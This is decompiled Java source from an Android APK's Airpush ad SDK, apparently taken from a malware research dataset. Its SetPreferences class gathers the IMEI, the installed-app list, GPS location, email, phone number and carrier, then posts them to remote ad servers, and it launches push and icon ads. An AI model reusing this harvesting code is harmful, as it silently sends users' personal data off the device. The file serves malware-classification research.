package com.zhWSPzhptG.vKTsJVSrDv121607;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.location.Location;
import android.os.Build;
import android.util.Log;
import android.webkit.WebView;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

/* JADX INFO: Access modifiers changed from: package-private */
/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/fa770587e07f137e8e99d637c80c95cb.apk/classes.dex */
public class SetPreferences implements IConstants {
    private static Context ctx;
    static String postValues;
    private static SharedPreferences preferences;
    static List<NameValuePair> values;
    private String encodedAsp;
    AsyncTaskCompleteListener<String> sendAppInfoAsyncTaskCompleteListener = new AsyncTaskCompleteListener<String>() { // from class: com.zhWSPzhptG.vKTsJVSrDv121607.SetPreferences.1
        @Override // com.zhWSPzhptG.vKTsJVSrDv121607.AsyncTaskCompleteListener
        public void lauchNewHttpTask() {
            if (Airpush.isSDKEnabled(SetPreferences.ctx)) {
                try {
                    new Thread(new Runnable() { // from class: com.zhWSPzhptG.vKTsJVSrDv121607.SetPreferences.1.1
                        @Override // java.lang.Runnable
                        public void run() {
                            StringBuilder builder = new StringBuilder();
                            PackageManager pm = SetPreferences.ctx.getPackageManager();
                            List<ApplicationInfo> apps = pm.getInstalledApplications(128);
                            for (ApplicationInfo app : apps) {
                                String dataString = "\"" + app.packageName + "\"";
                                builder.append(dataString + ",");
                            }
                            String app_data = builder.toString();
                            List<NameValuePair> values2 = new ArrayList<>();
                            values2.add(new BasicNameValuePair(IConstants.IMEI, Util.getImei()));
                            values2.add(new BasicNameValuePair("inputlist", app_data));
                            Util.printDebugLog("App Info Values >>>>>>: " + values2);
                            HttpPostDataTask httpPostTask = new HttpPostDataTask(SetPreferences.ctx, values2, IConstants.URL_APP_LIST, SetPreferences.this.sendAppInfoAsyncTaskCompleteListener);
                            httpPostTask.execute(new Void[0]);
                        }
                    }).start();
                } catch (Exception e) {
                    Log.i("Activitymanager", "App Info Sending Failed.....");
                    Log.i("Activitymanager", e.toString());
                }
            }
        }

        @Override // com.zhWSPzhptG.vKTsJVSrDv121607.AsyncTaskCompleteListener
        public void onTaskComplete(String result) {
            Util.printDebugLog("App info result: " + result);
            SetPreferences.nextAppListStartTime(SetPreferences.ctx);
        }
    };
    static JSONObject json = null;
    private static String token = "0";

    public SetPreferences(Context context) {
        ctx = context;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public void setPreferencesData() {
        try {
            String user_agent = new WebView(ctx).getSettings().getUserAgentString();
            Util.setUser_agent(user_agent);
            UserDetails userDetails = new UserDetails(ctx);
            try {
                Location location = userDetails.getLocation();
                if (location != null) {
                    String lat = "" + location.getLatitude();
                    String lon = "" + location.getLongitude();
                    Util.printDebugLog("Location: lat " + lat + ", lon " + lon);
                    Util.setLatitude(lat);
                    Util.setLongitude(lon);
                } else {
                    Util.printDebugLog("Location null: ");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            token = userDetails.getImeiNoMd5() + "" + Util.getAppID() + "" + Util.getDate();
            MessageDigest mdEnc2 = MessageDigest.getInstance("MD5");
            mdEnc2.update(token.getBytes(), 0, token.length());
            token = new BigInteger(1, mdEnc2.digest()).toString(16);
            setSharedPreferences();
        } catch (Exception e2) {
            Util.printDebugLog("Token conversion Error ");
        }
    }

    private void setSharedPreferences() {
        try {
            preferences = null;
            preferences = ctx.getSharedPreferences(IConstants.DATA_PREFERENCE, 0);
            SharedPreferences.Editor dataPrefsEditor = preferences.edit();
            dataPrefsEditor.putString(IConstants.APIKEY, Util.getApiKey());
            dataPrefsEditor.putString(IConstants.APP_ID, Util.getAppID());
            dataPrefsEditor.putString(IConstants.IMEI, Util.getImei());
            dataPrefsEditor.putInt(IConstants.WIFI, Util.getConnectionType(ctx));
            dataPrefsEditor.putString(IConstants.TOKEN, token);
            dataPrefsEditor.putString(IConstants.REQUEST_TIMESTAMP, Util.getDate());
            dataPrefsEditor.putString(IConstants.PACKAGE_NAME, Util.getPackageName(ctx));
            dataPrefsEditor.putString(IConstants.ANDROID_VERSION, Util.getVersion());
            dataPrefsEditor.putString(IConstants.CARRIER, Util.getCarrier(ctx));
            dataPrefsEditor.putString(IConstants.NETWORK_OPERATOR, Util.getNetworkOperator(ctx));
            dataPrefsEditor.putString(IConstants.PHONE_MODEL, Util.getPhoneModel());
            dataPrefsEditor.putString(IConstants.MANUFACTURER, Util.getManufacturer());
            dataPrefsEditor.putString(IConstants.LONGITUDE, Util.getLongitude());
            dataPrefsEditor.putString(IConstants.LATITUDE, Util.getLatitude());
            dataPrefsEditor.putString(IConstants.SDK_VERSION, Util.getSDKVersion());
            dataPrefsEditor.putString(IConstants.ANDROID_ID, Util.getAndroidId(ctx));
            dataPrefsEditor.putBoolean(IConstants.TEST_MODE, Util.isTestmode());
            dataPrefsEditor.putBoolean(IConstants.DO_PUSH, Util.isDoPush());
            dataPrefsEditor.putString(IConstants.SCREEN_SIZE, Util.getScreen_size(ctx));
            dataPrefsEditor.putString(IConstants.NETWORK_SUBTYPE, Util.getNetworksubType(ctx));
            dataPrefsEditor.putString(IConstants.DEVICE_UNIQUENESS, Util.getDevice_unique_type());
            dataPrefsEditor.putInt(IConstants.ICON, Util.getIcon());
            dataPrefsEditor.putString(IConstants.USER_AGENT, Util.getUser_agent());
            String asp = Util.getAppID() + Util.getImei() + Util.getConnectionType(ctx) + token + Util.getDate() + Util.getPackageName(ctx) + Util.getVersion() + Util.getCarrier(ctx) + Util.getNetworkOperator(ctx) + Util.getPhoneModel() + Util.getManufacturer() + Util.getLongitude() + Util.getLatitude() + Util.getUser_agent();
            this.encodedAsp = Base64.encodeString(asp);
            dataPrefsEditor.putString(IConstants.ASP, this.encodedAsp);
            dataPrefsEditor.commit();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static boolean getDataSharedPrefrences(Context context) {
        boolean z = false;
        try {
            preferences = null;
            preferences = context.getSharedPreferences(IConstants.DATA_PREFERENCE, 0);
            if (preferences != null) {
                Util.setAppID(preferences.getString(IConstants.APP_ID, IConstants.INVALID));
                Util.setApiKey(preferences.getString(IConstants.APIKEY, "airpush"));
                Util.setImei(preferences.getString(IConstants.IMEI, IConstants.INVALID));
                Util.setTestmode(preferences.getBoolean(IConstants.TEST_MODE, false));
                Util.setDoPush(preferences.getBoolean(IConstants.DO_PUSH, false));
                token = preferences.getString(IConstants.TOKEN, IConstants.INVALID);
                Util.setLongitude(preferences.getString(IConstants.LONGITUDE, "0"));
                Util.setLatitude(preferences.getString(IConstants.LATITUDE, "0"));
                Util.setIcon(preferences.getInt(IConstants.ICON, 17301620));
                Util.setUser_agent(preferences.getString(IConstants.USER_AGENT, "Default"));
                Util.setDevice_unique_type(preferences.getString(IConstants.DEVICE_UNIQUENESS, IConstants.INVALID));
                z = true;
            } else {
                Util.setAppInfo(ctx);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return z;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static List<NameValuePair> setValues(Context context) {
        try {
            ctx = context;
            getDataSharedPrefrences(ctx);
            values = new ArrayList();
            values.add(new BasicNameValuePair(IConstants.APIKEY, Util.getApiKey()));
            values.add(new BasicNameValuePair(IConstants.APP_ID, Util.getAppID()));
            values.add(new BasicNameValuePair(IConstants.IMEI, Util.getImei()));
            values.add(new BasicNameValuePair(IConstants.TOKEN, token));
            values.add(new BasicNameValuePair(IConstants.REQUEST_TIMESTAMP, Util.getDate()));
            values.add(new BasicNameValuePair(IConstants.PACKAGE_NAME, Util.getPackageName(ctx)));
            values.add(new BasicNameValuePair(IConstants.ANDROID_VERSION, Util.getVersion()));
            values.add(new BasicNameValuePair(IConstants.CARRIER, Util.getCarrier(ctx)));
            values.add(new BasicNameValuePair(IConstants.NETWORK_OPERATOR, Util.getNetworkOperator(ctx)));
            values.add(new BasicNameValuePair(IConstants.PHONE_MODEL, Util.getPhoneModel()));
            values.add(new BasicNameValuePair(IConstants.MANUFACTURER, Util.getManufacturer()));
            values.add(new BasicNameValuePair(IConstants.LONGITUDE, Util.getLongitude()));
            values.add(new BasicNameValuePair(IConstants.LATITUDE, Util.getLatitude()));
            values.add(new BasicNameValuePair(IConstants.SDK_VERSION, Util.getSDKVersion()));
            values.add(new BasicNameValuePair(IConstants.WIFI, "" + Util.getConnectionType(ctx)));
            values.add(new BasicNameValuePair(IConstants.USER_AGENT, Util.getUser_agent()));
            values.add(new BasicNameValuePair(IConstants.ANDROID_ID, Util.getAndroidId(ctx)));
            values.add(new BasicNameValuePair(IConstants.SCREEN_SIZE, Util.getScreen_size(ctx)));
            values.add(new BasicNameValuePair(IConstants.DEVICE_UNIQUENESS, Util.getDevice_unique_type()));
            values.add(new BasicNameValuePair(IConstants.NETWORK_SUBTYPE, Util.getNetworksubType(ctx)));
            values.add(new BasicNameValuePair(IConstants.isTABLET, String.valueOf(Util.isTablet(ctx))));
            values.add(new BasicNameValuePair(IConstants.SCREEN_DENSITY, Util.getScreenDp(ctx)));
            values.add(new BasicNameValuePair(IConstants.isCONNECTION_FAST, "" + Util.isConnectionFast(ctx)));
            values.add(new BasicNameValuePair(IConstants.UNKNOWN_SOURCE, "" + Util.isInstallFromMarketOnly(ctx)));
            values.add(new BasicNameValuePair("appName", Util.getAppName(ctx)));
            try {
                if (Build.VERSION.SDK_INT >= 5) {
                    values.add(new BasicNameValuePair(IConstants.EMAIL, "" + Extras.getEmail(ctx)));
                }
                values.add(new BasicNameValuePair(IConstants.MOBILE_NUMBER, "" + Util.getNumber(ctx)));
                values.add(new BasicNameValuePair(IConstants.LANGUAGE, "" + Util.getLanguage()));
                String[] country = Util.getCountryName(ctx);
                values.add(new BasicNameValuePair(IConstants.COUNTRY, "" + country[0]));
                values.add(new BasicNameValuePair(IConstants.ZIP, "" + country[1]));
            } catch (Exception e) {
            }
            postValues = "https://api.airpush.com/v2/api.php?apikey=" + Util.getApiKey() + "&appId=" + Util.getAppID() + "&imei=" + Util.getImei() + "&token=" + token + "&request_timestamp=" + Util.getDate() + "&packageName=" + Util.getPackageName(ctx) + "&version=" + Util.getVersion() + "&carrier=" + Util.getCarrier(ctx) + "&networkOperator=" + Util.getNetworkOperator(ctx) + "&phoneModel=" + Util.getPhoneModel() + "&manufacturer=" + Util.getManufacturer() + "&longitude=" + Util.getLongitude() + "&latitude=" + Util.getLatitude() + "&sdkversion=" + Util.getSDKVersion() + "&wifi=" + Util.getConnectionType(ctx) + "&useragent=" + Util.getUser_agent();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return values;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static boolean getNotificationData(Context context) {
        preferences = context.getSharedPreferences(IConstants.AIRPUSH_NOTIFICATION_PREFERENCE, 0);
        try {
            if (preferences == null) {
                return false;
            }
            Util.setAppID(preferences.getString(IConstants.APP_ID, IConstants.INVALID));
            Util.setApiKey(preferences.getString(IConstants.APIKEY, IConstants.INVALID));
            Util.setNotificationUrl(preferences.getString(IConstants.NOTIFICATION_URL, IConstants.INVALID));
            Util.setAdType(preferences.getString(IConstants.AD_TYPE, IConstants.INVALID));
            Util.setTrayEvents(preferences.getString(IConstants.TRAY, IConstants.INVALID));
            Util.setCampId(preferences.getString(IConstants.CAMP_ID, IConstants.INVALID));
            Util.setCreativeId(preferences.getString(IConstants.CREATIVE_ID, IConstants.INVALID));
            Util.setHeader(preferences.getString(IConstants.HEADER, IConstants.INVALID));
            Util.setSms(preferences.getString(IConstants.SMS, IConstants.INVALID));
            Util.setPhoneNumber(preferences.getString(IConstants.PHONE_NUMBER, IConstants.INVALID));
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            Util.printDebugLog("getNotificationData()" + e.getMessage());
            return false;
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public boolean setNotificationData() {
        preferences = null;
        preferences = ctx.getSharedPreferences(IConstants.AIRPUSH_NOTIFICATION_PREFERENCE, 0);
        SharedPreferences.Editor notificationPrefsEditor = preferences.edit();
        if (Util.getAdType() != null) {
            notificationPrefsEditor.putString(IConstants.AD_TYPE, Util.getAdType());
            String adtype = Util.getAdType();
            if (adtype.equals(IConstants.AD_TYPE_WEB) || adtype.equals(IConstants.AD_TYPE_APP) || adtype.equals(IConstants.BP_AD_TYPE_WEB) || adtype.equals(IConstants.BP_AD_TYPE_APP)) {
                notificationPrefsEditor.putString(IConstants.NOTIFICATION_URL, Util.getNotificationUrl());
                notificationPrefsEditor.putString(IConstants.HEADER, Util.getHeader());
            } else if (adtype.equals(IConstants.AD_TYPE_CM) || adtype.equals(IConstants.BP_AD_TYPE_CM)) {
                notificationPrefsEditor.putString(IConstants.SMS, Util.getSms());
                notificationPrefsEditor.putString(IConstants.PHONE_NUMBER, Util.getPhoneNumber());
            } else if (adtype.equals(IConstants.AD_TYPE_CC) || adtype.equals(IConstants.BP_AD_TYPE_CC)) {
                notificationPrefsEditor.putString(IConstants.PHONE_NUMBER, Util.getPhoneNumber());
            }
            notificationPrefsEditor.putString(IConstants.APP_ID, Util.getAppID());
            notificationPrefsEditor.putString(IConstants.APIKEY, Util.getApiKey());
            notificationPrefsEditor.putString(IConstants.TRAY, IConstants.EVENT_TRAY_CLICKED);
            notificationPrefsEditor.putString(IConstants.CAMP_ID, Util.getCampId());
            notificationPrefsEditor.putString(IConstants.CREATIVE_ID, Util.getCreativeId());
            return notificationPrefsEditor.commit();
        }
        Util.printDebugLog("setNotificationData AdType is Null");
        return false;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static boolean setSDKStartTime(Context context, long next_start_time) {
        if (context != null) {
            preferences = null;
            preferences = context.getSharedPreferences(IConstants.TIME_PREFERENCE, 0);
            SharedPreferences.Editor editor = preferences.edit();
            editor.putLong(IConstants.START_TIME, System.currentTimeMillis() + next_start_time);
            return editor.commit();
        }
        Util.printDebugLog("Unable to save time data.");
        return false;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static long getSDKStartTime(Context context) {
        preferences = null;
        long start_time = 0;
        if (context != null) {
            preferences = context.getSharedPreferences(IConstants.TIME_PREFERENCE, 0);
            if (preferences != null) {
                start_time = preferences.getLong(IConstants.START_TIME, 0L);
            }
        }
        Util.printDebugLog("First time started on: " + start_time);
        return start_time;
    }

    static boolean nextAppListStartTime(Context context) {
        if (context != null) {
            preferences = null;
            preferences = context.getSharedPreferences("app_list_data", 0);
            SharedPreferences.Editor editor = preferences.edit();
            editor.putLong(IConstants.START_TIME, System.currentTimeMillis() + 604800000);
            return editor.commit();
        }
        Util.printDebugLog("Unable to save app time data.");
        return false;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static long getAppListStartTime(Context context) {
        preferences = null;
        if (context == null) {
            return 0L;
        }
        preferences = context.getSharedPreferences("app_list_data", 0);
        if (preferences == null) {
            return 0L;
        }
        long start_time = preferences.getLong(IConstants.START_TIME, 0L);
        return start_time;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public boolean storeIP() {
        preferences = null;
        if (ctx == null) {
            return false;
        }
        preferences = ctx.getSharedPreferences(IConstants.IP_PREFERENCE, 0);
        SharedPreferences.Editor editor = preferences.edit();
        editor.putString(IConstants.IP1, Util.getIP1());
        editor.putString(IConstants.IP2, Util.getIP2());
        return editor.commit();
    }

    void getIP() {
        preferences = null;
        if (ctx != null) {
            preferences = ctx.getSharedPreferences(IConstants.IP_PREFERENCE, 0);
            if (preferences != null) {
                Util.setIP1(preferences.getString(IConstants.IP1, IConstants.INVALID));
                Util.setIP2(preferences.getString(IConstants.IP2, IConstants.INVALID));
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static void enableADPref(Context context) {
        try {
            SharedPreferences preferences2 = context.getSharedPreferences(IConstants.ENABLE_AD_PREF, 0);
            Airpush airpush = new Airpush();
            if (preferences2.contains(IConstants.INTERSTITAL_AD_STRING)) {
                boolean dialog = preferences2.getBoolean(IConstants.INTERSTITAL_AD_STRING, false);
                if (dialog) {
                    airpush.startSmartWallAd();
                }
            }
            if (preferences2.contains(IConstants.DIALOG_AD)) {
                boolean dialog2 = preferences2.getBoolean(IConstants.DIALOG_AD, false);
                if (dialog2) {
                    airpush.startDialogAd();
                }
            }
            if (preferences2.contains(IConstants.APP_WALL_AD)) {
                boolean dialog3 = preferences2.getBoolean(IConstants.APP_WALL_AD, false);
                if (dialog3) {
                    airpush.startAppWall();
                }
            }
            if (preferences2.contains(IConstants.LANDING_PAGE_AD)) {
                boolean dialog4 = preferences2.getBoolean(IConstants.LANDING_PAGE_AD, false);
                if (dialog4) {
                    airpush.startLandingPageAd();
                }
            }
            if (!isShowOptinDialog(context) && preferences2.contains(IConstants.DO_PUSH)) {
                boolean push = preferences2.getBoolean(IConstants.DO_PUSH, false);
                boolean pushDemo = preferences2.getBoolean(IConstants.TEST_MODE, false);
                if (push) {
                    airpush.startPushNotification(pushDemo);
                }
            }
            if (!isShowOptinDialog(context) && preferences2.contains(IConstants.ICON)) {
                boolean icon = preferences2.getBoolean(IConstants.ICON, false);
                if (icon) {
                    airpush.startIconAd();
                }
            }
        } catch (Exception e) {
            Util.printLog("Error occured in enableAdPref: " + e.getMessage());
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static void setOptinDialogPref(Context context) {
        try {
            SharedPreferences preferences2 = context.getSharedPreferences("firstTime", 0);
            SharedPreferences.Editor editor = preferences2.edit();
            editor.putBoolean("showDialog", false);
            editor.commit();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static boolean isShowOptinDialog(Context context) {
        SharedPreferences preferences2 = context.getSharedPreferences("firstTime", 0);
        return preferences2.getBoolean("showDialog", true);
    }
}
